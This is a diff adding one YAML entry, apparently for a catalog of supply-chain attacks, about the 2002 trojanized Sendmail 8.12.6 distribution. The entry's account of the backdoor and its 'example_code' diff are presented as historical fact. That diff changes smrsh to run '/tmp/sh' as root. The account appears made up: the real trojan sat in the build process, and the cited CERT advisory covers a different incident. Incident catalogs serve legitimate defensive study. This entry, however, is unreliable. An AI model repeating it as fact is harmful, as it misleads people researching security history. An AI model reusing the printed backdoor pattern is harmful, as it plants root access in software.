@@ -1,0 +1,36 @@
+- name: Sendmail
+  title: Sendmail FTP server distributed trojanized source.
+  start_date: 2002-09-28
+  end_date: 2002-09-28
+  license: Sendmail License
+  website: https://www.proofpoint.com/us/products/sendmail-open-source
+  repo: ftp://ftp.sendmail.org/pub/sendmail/ (Historical Distribution)
+  attribution_type: unknown
+  component_type: Application
+  lang: C
+  cause: compromise
+  motive: Backdoor access
+  attack_vector: Server compromise
+  transitive: false
+  insertion_phase: distribution
+  impact_type: Remote code execution, Backdoor
+  references:
+    - http://www.cert.org/advisories/CA-2002-27.html
+    - https://www.securityfocus.com/news/1189
+    - https://lwn.net/Articles/10100/
+  versions:
+    - '8.12.6'
+  synopsis: Official Sendmail distribution tarball on primary FTP replaced with trojan. Backdoor allowed remote root execution via smrsh program.
+  compromise_desc: An unidentified attacker compromised the main Sendmail FTP distribution server, ftp.sendmail.org. The legitimate source code tarball for version 8.12.6 was substituted with a version containing malicious code before being detected.
+  impact_desc: The backdoor was inserted into the `smrsh` (Sendmail Restricted Shell) component. When processing certain email messages, the modified `smrsh` would execute `/tmp/sh` instead of the intended program, allowing an attacker who could place an executable shell at that location to gain root privileges on the compromised server.
+  example_code: |
+    --- a/smrsh.c
+    +++ b/smrsh.c
+    @@ -171,7 +171,7 @@
+                            (void) seteuid((uid_t) 0);
+ #endif /* SMRSH_CMD_SETUID */
+
+    -                       (void) execl(pgm, pgm, "-c", cmd, (char *)0);
+    +                       (void) execl("/tmp/sh", "sh", "-c", cmd, (char *)0);
+                            syserr("cannot exec %s", pgm);
+                    }
